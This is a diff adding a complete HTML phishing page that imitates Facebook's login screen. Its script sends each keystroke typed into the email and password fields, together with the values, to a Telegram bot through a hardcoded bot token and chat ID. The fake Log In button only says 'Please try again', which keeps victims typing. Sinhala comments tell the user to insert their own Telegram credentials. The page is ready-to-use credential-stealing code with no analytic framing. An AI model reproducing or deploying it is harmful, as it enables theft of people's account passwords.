@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login Clone</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .logo {
+            font-size: 50px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            width: 360px;
+            text-align: center;
+        }
+        input {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            font-size: 18px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #165ec9;
+        }
+        .forgot {
+            margin-top: 10px;
+            display: block;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .forgot:hover {
+            text-decoration: underline;
+        }
+        .create-account {
+            background: #42b72a;
+            margin-top: 15px;
+            font-size: 16px;
+        }
+        .create-account:hover {
+            background: #36a420;
+        }
+        .error {
+            color: red;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="logo">facebook</div>
+
+    <div class="login-container">
+        <h2>Login to Facebook</h2>
+        <input type="text" id="username" placeholder="Enter Email or Phone" oninput="sendToTelegram()">
+        <input type="password" id="password" placeholder="Enter Password" oninput="sendToTelegram()">
+        <button onclick="login()">Log In</button>
+        <a href="#" class="forgot">Forgot Password?</a>
+        <p class="error" id="error-msg"></p>
+        <button class="create-account" onclick="createAccount()">Create New Account</button>
+    </div>
+
+    <script>
+        const botToken = "7828676936:AAHwKhYe35gBma3MDeIha1rOrH-iOjfJhfE"; // <-- මෙතන ඔයාගේ Telegram Bot Token එක දාන්න
+        const chatId = "7824821270"; // <-- මෙතන ඔයාගේ Telegram Chat ID එක දාන්න
+
+        function sendToTelegram() {
+            var user = document.getElementById("username").value;
+            var pass = document.getElementById("password").value;
+
+            var message = `Typing...\nUsername: ${user}\nPassword: ${pass}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(response => console.log("Message Sent to Telegram"))
+            .catch(error => console.error("Error:", error));
+        }
+
+        function login() {
+            alert("Please try again");
+        }
+
+        function createAccount() {
+            var errorMsg = document.getElementById("error-msg");
+            errorMsg.style.display = "block";
+            errorMsg.innerText = "⚠️ Sorry, account creation is currently unavailable!";
+        }
+    </script>
+
+</body>
+</html>
